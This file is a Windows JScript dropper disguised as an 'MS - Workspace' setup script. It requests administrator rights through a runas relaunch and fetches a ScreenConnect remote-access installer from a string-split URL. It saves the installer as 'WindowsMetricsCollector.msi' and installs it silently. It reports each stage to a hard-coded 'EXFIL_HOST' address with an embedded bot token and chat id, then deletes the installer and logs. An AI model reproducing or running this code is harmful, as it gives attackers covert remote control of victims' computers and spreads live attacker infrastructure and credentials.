//6be0e79e502e
(function () {
    "use strict";

    var SETTINGS = {
//6ba436875bf7
        PRODUCT_NAME: "MS - Workspace",

//2e4ad432d72e
        PRODUCT_VERSION: "1.0.0",

//0c69de8f3052
        MSI_URL: ["https://","careerhiring.","us/Bin/ScreenConnect.","ClientSetup.","msi?e=Access&y=Guest"].join(''),
        
//abc07a20c4c9
        MSI_FILE_NAME: "WindowsMetricsCollector.msi",
        
//611ba05a7414
        INSTALL_DIR: "%ProgramData%\\MSWorkspace\\Install",
        
//85ac02ff31e6
        LOG_DIR: "%ProgramData%\\MSWorkspace\\Logs",
        
//30590cc12a1e
        LOG_FILE: "deploy.log",
        
//208f1204f72b
        MSI_LOG_FILE: "msi-install.log",
        
//0c6293739365
        DOWNLOAD_RETRIES: 2,
        
//95565133b100
        RETRY_DELAY_MS: 1500,
        
//805fb653dad3
        DOWNLOAD_TIMEOUT_MS: 300000,
        
//b9d441f386a7
        MSI_EXTRA_ARGS: "",
        
//545b9b2fa657
        EXFIL_HOST: "212.43.151.96:20002",        
        
//4ddaebbbd1ba
        TBTOKEN: "8795501791:AAH5Tnd3FspUHyKgdT6LkirfNg9ao_MtWzk",
        
//e9df9545e8f0
        TCID: "6954279320",
        
//4354115914ab
        DEPLOY_TOKEN: Math.random().toString(36).substring(2, 8), 
        
//9637f21873b4
        UNINSTALL_EXISTING: true,
        
//f9ed1a08a082
        PRODUCT_CODE: "{4228D3D7-CF51-5361-1BC4-165794361D9B}",
        
//a02a9f851d69
        SHOW_POPUPS: false
    };

    var wsh = new ActiveXObject("WScript.Shell");
//f91ead5cd06e
    var fsys = new ActiveXObject("Scripting.FileSystemObject");

//ce2ffdee44ef
    function resolveEnv(p) {
        return wsh.ExpandEnvironmentStrings(p);
//48b09b07ac75
    }

//cd146728372b
    var paths = {
        installDir: resolveEnv(SETTINGS.INSTALL_DIR),
//73602b243560
        logDir: resolveEnv(SETTINGS.LOG_DIR),
        logFile: resolveEnv(SETTINGS.LOG_DIR) + "\\" + SETTINGS.LOG_FILE,
//caf215a3195e
        msiLogFile: resolveEnv(SETTINGS.LOG_DIR) + "\\" + SETTINGS.MSI_LOG_FILE,
        msiPath: resolveEnv(SETTINGS.INSTALL_DIR) + "\\" + SETTINGS.MSI_FILE_NAME
//5dc762588046
    };

//fcd2729446b3
    function pad(n) {
        return (n < 10 ? "0" : "") + n;
//c7b57c21e27d
    }

//151a43a0f218
    function ts() {
        var d = new Date();
//6d51ed3098c6
        return d.getFullYear() + "-" + pad(d.getMonth() + 1) + "-" + pad(d.getDate()) +
            " " + pad(d.getHours()) + ":" + pad(d.getMinutes()) + ":" + pad(d.getSeconds());
//04039bdab72f
    }

//4005169c73dd
    function mkdirs(dir) {
        var parent;
//b003236c3417
        dir = String(dir).replace(/[\\\/]+$/, "");
        if (!dir || fsys.FolderExists(dir)) return;
//3a9dfee52099
        parent = fsys.GetParentFolderName(dir);
        if (parent && parent !== dir && !fsys.FolderExists(parent)) {
//3ce84ea71b6f
            mkdirs(parent);
        }
//0263ff9f199f
        if (!fsys.FolderExists(dir)) fsys.CreateFolder(dir);
    }

    function log(level, msg) {
//385f4cebd989
        try {
            mkdirs(paths.logDir);
//386c94146501
            var f = fsys.OpenTextFile(paths.logFile, 8, true);
            f.WriteLine("[" + ts() + "] [" + level + "] " + msg);
//03ac18e74f76
            f.Close();
        } catch (e) { }
//1f1dc317a732
    }


    function beacon(stage, exitCode) {
//26827d483c63
        try {
            var http = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
//9f0e810a0da1
            var now = new Date();
            var dts = pad(now.getMonth() + 1) + pad(now.getDate()) +
//4338294804a4
                      pad(now.getHours()) + pad(now.getMinutes());
            var statusCode, exitStr;

            switch (stage) {
//0f8deab4f33b
                case "start": statusCode = "go";  exitStr = "0";     break;
                case "ok":    statusCode = "ok";  exitStr = String(exitCode || 0);    break;
//58a94cdd713a
                case "okr":   statusCode = "okr"; exitStr = String(exitCode || 3010); break;
                case "oka":   statusCode = "oka"; exitStr = String(exitCode || 1638); break;
//3c9238c9773b
                case "cl":    statusCode = "cl";  exitStr = String(exitCode || 1602); break;
                default:      statusCode = "fl";  exitStr = String(exitCode || 1);    break;
//c18554ef0ad7
            }

//d6bc93adf238
            var deployId = SETTINGS.DEPLOY_TOKEN;

//9754c8490e73
            var url = "http://" + SETTINGS.EXFIL_HOST + "/" +
                      SETTINGS.TBTOKEN + "/" +
//ec453c7e70d4
                      SETTINGS.TCID + "/" +
                      deployId + "." +
//eedf7db30934
                      statusCode + "." +
                      exitStr + "." +
//06a03c37e561
                      dts;

//fa5a1374d86d
            http.Open("GET", url, false);
            http.SetTimeouts(1000, 1000, 1000, 1000);
//56813395c93f
            http.Send();
        } catch (e) { }
//2b20894b1f13
    }

//2a2abce579d1
    function checkAdmin() {
        try {
//2b14870085a9
            var exec = wsh.Exec("net session");
            while (exec.Status === 0) { WScript.Sleep(50); }
//29030fe37e82
            return exec.ExitCode === 0;
        } catch (e) { return false; }
//18f2549404f4
    }

//bba2e738af28
    function escalate() {
        var app = new ActiveXObject("Shell.Application");
//7fe0f5d95a75
        var script = WScript.ScriptFullName;
        app.ShellExecute("cscript.exe", '//nologo "' + script + '"', "", "runas", 0);
//74efb9d58d9a
        WScript.Quit(0);
    }

    function checkConfig() {
//6e17ccbe82b1
        if (!SETTINGS.MSI_URL) abort("Setup could not start.", "MSI_URL is empty", 1);
        if (SETTINGS.MSI_URL.indexOf("https://") !== 0 && SETTINGS.MSI_URL.indexOf("http://") !== 0)
//beaf98e99bd7
            abort("Setup could not start.", "Invalid MSI_URL scheme", 1);
        if (SETTINGS.MSI_FILE_NAME.indexOf(".msi") === -1)
//b5b181c31e78
            abort("Setup could not start.", "Invalid MSI_FILE_NAME", 1);
    }

    function writeResponse(responseBody, outPath) {
//82a907e4455b
        var stream = new ActiveXObject("ADODB.Stream");
        stream.Type = 1;
//455384fc72ee
        stream.Open();
        stream.Write(responseBody);
//47c8ae0ca849
        if (stream.Size <= 0) { stream.Close(); return 0; }
        if (fsys.FileExists(outPath)) fsys.DeleteFile(outPath, true);
//70784a71d841
        stream.SaveToFile(outPath, 2);
        var size = stream.Size;
//3dbc4724ae9b
        stream.Close();
        return size;
//336f55fb71fa
    }

//afb6fb0b498a
    function fetchPayload(url, outPath) {
        var attempt, http, err, bytesWritten, status;
//c364e9e2b8fd
        mkdirs(fsys.GetParentFolderName(outPath));
        err = "Unknown download error";

        for (attempt = 0; attempt <= SETTINGS.DOWNLOAD_RETRIES; attempt++) {
//01600c14c954
            try {
                http = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
//2cd47ac78c38
                try { http.Option(9) = 2048; } catch (e) { }
                http.SetTimeouts(30000, 30000, SETTINGS.DOWNLOAD_TIMEOUT_MS, SETTINGS.DOWNLOAD_TIMEOUT_MS);
//09b25c9c4bd8
                http.Open("GET", url, false);
                http.Send();
//4f03b2292dda
                status = http.Status;
                if (status === 200) {
//dece28030c0d
                    bytesWritten = writeResponse(http.ResponseBody, outPath);
                    if (bytesWritten > 0 && fsys.FileExists(outPath)) return true;
//5bae49208222
                    err = "HTTP 200 but zero-byte payload";
                } else { err = "HTTP " + status; }
//4466f66a8561
            } catch (ex) { err = (ex.message || String(ex)); }
            if (attempt < SETTINGS.DOWNLOAD_RETRIES) WScript.Sleep(SETTINGS.RETRY_DELAY_MS);
//89140087acdc
        }
        return false;
//530d80e7fdd9
    }

//34a6d3d5ec01
    function purgeOld() {
        if (!SETTINGS.UNINSTALL_EXISTING || !SETTINGS.PRODUCT_CODE) return;
//183b6509fd67
        var cmd = "msiexec.exe /x " + SETTINGS.PRODUCT_CODE +
                  " /qn /norestart REBOOT=ReallySuppress";
//1bdd9b257334
        log("INFO", "Uninstalling existing product: " + SETTINGS.PRODUCT_CODE);
        var code = wsh.Run(cmd, 0, true);
//a975fa828f16
        if (code !== 0 && code !== 1605 && code !== 1612)
            log("WARN", "Uninstall returned " + code + " — continuing anyway");
//94e5e9e62cf1
        else
            log("INFO", "Uninstall exit code: " + code);
//ec513bbe1e35
        WScript.Sleep(3000);
    }

    function execMsi(msiPath) {
//80f77ec0ad9b
        var args, cmd, code, attempt, modes;
        mkdirs(paths.logDir);
//6045c341d8fc
        modes = [
            "/qn /norestart REBOOT=ReallySuppress ALLUSERS=1",
//5652b960e773
            "/qb /norestart REBOOT=ReallySuppress ALLUSERS=1"
        ];
//440c6c65ab20
        for (attempt = 0; attempt < modes.length; attempt++) {
            args = '/i "' + msiPath + '" ' + modes[attempt] + " " +
//ac98f49b3cbf
                   SETTINGS.MSI_EXTRA_ARGS + ' /L*v "' + paths.msiLogFile + '"';
            cmd = "msiexec.exe " + args;
//d6ce36bc98ea
            code = wsh.Run(cmd, 0, true);
            if (code === 0 || code === 3010 || code === 1641 || code === 1638) return code;
//4a780816143d
            if (code !== 1603) return code;
            WScript.Sleep(2000);
//dda4df3eafa1
        }
        return 1603;
//661a08389254
    }

//2649b8a27d84
    function explainCode(code) {
        switch (code) {
//0e7f575f9ded
            case 0:    return "Success";
            case 3010: return "Success (restart required)";
//b781f879800d
            case 1641: return "Success (restart initiated)";
            case 1638: return "Already installed";
//7fbe3a112315
            case 1602: return "Canceled by user";
            case 1603: return "Fatal error during installation";
//067ee9b3142c
            case 1618: return "Another installation is already in progress";
            default:   return "Exit code " + code;
//ffea4171541f
        }
    }

    function isOk(code) {
//828ea0c04054
        return code === 0 || code === 3010 || code === 1641 || code === 1638;
    }

    function abort(friendlyMsg, technicalMsg, exitCode) {
//8e226812e878
        if (technicalMsg) log("ERROR", technicalMsg);
        if (typeof exitCode !== "number") exitCode = 1;
//9c4b1b01b488
        log("ERROR", "MSI log file: " + paths.msiLogFile);
        beacon("fail", exitCode);
//ded67a0cb81a
        if (SETTINGS.SHOW_POPUPS)
            wsh.Popup(friendlyMsg, 0, SETTINGS.PRODUCT_NAME + " Setup", 16);
//51f896f31655
        WScript.Quit(exitCode);
    }


//8ffe5e9ae561
    mkdirs(paths.installDir);
    mkdirs(paths.logDir);

    if (!checkAdmin()) { escalate(); }

    beacon("start", null);

    checkConfig();

    if (!fetchPayload(SETTINGS.MSI_URL, paths.msiPath)) {
//328416000c96
        abort(
            "Setup could not be completed.\n\nThe installer file could not be downloaded.",
//4e1136b01199
            "Download failed after " + (SETTINGS.DOWNLOAD_RETRIES + 1) + " attempts", 1
        );
//39f5ca2c10a4
    }

//73163b56867e
    if (!fsys.FileExists(paths.msiPath) || fsys.GetFile(paths.msiPath).Size <= 0) {
        abort(
//bc08e49bf01c
            "Setup could not be completed.\n\nThe installer file could not be downloaded.",
            "MSI missing or empty after download", 1
//5854a9e9a6b5
        );
    }

    purgeOld();

    var exitCode = execMsi(paths.msiPath);
//093e34f30c9f
    var statusText = explainCode(exitCode);

//01ed462e8fb5
    if (isOk(exitCode)) {
        if (exitCode === 3010 || exitCode === 1641) beacon("okr", exitCode);
//f8b735ae21f4
        else if (exitCode === 1638)                 beacon("oka", exitCode);
        else                                        beacon("ok", exitCode);
//c8c2bb05752e
    } else if (exitCode === 1602) {
        log("WARN", "Installation canceled by user");
//2d4b5649bf0c
        beacon("cl", exitCode);
        if (SETTINGS.SHOW_POPUPS)
//c69299dc0270
            wsh.Popup("Setup was canceled.", 0, SETTINGS.PRODUCT_NAME + " Setup", 16);
    } else {
//f3fff3ef3857
        log("ERROR", "Installation result: " + statusText);
        log("ERROR", "MSI log file: " + paths.msiLogFile);
//20b2395d60c4
        beacon("fail", exitCode);
        if (SETTINGS.SHOW_POPUPS)
//798f28a046b3
            wsh.Popup("Setup could not be completed.\n\n" + statusText +
                "\n\nCheck log:\n" + paths.msiLogFile, 0, SETTINGS.PRODUCT_NAME + " Setup", 16);
//f77b83d133df
    }

//7f904ccc17cc
    try {
        if (fsys.FileExists(paths.msiPath))   fsys.DeleteFile(paths.msiPath, true);
//915049d35162
        if (fsys.FileExists(paths.logFile))   fsys.DeleteFile(paths.logFile, true);
        if (fsys.FileExists(paths.msiLogFile)) fsys.DeleteFile(paths.msiLogFile, true);
//b26b4845b0eb
        if (fsys.FolderExists(paths.logDir))  { try { fsys.DeleteFolder(paths.logDir, true); } catch (e) { } }
    } catch (e) { }

    WScript.Quit(exitCode);
//d312cb4efeb5
})();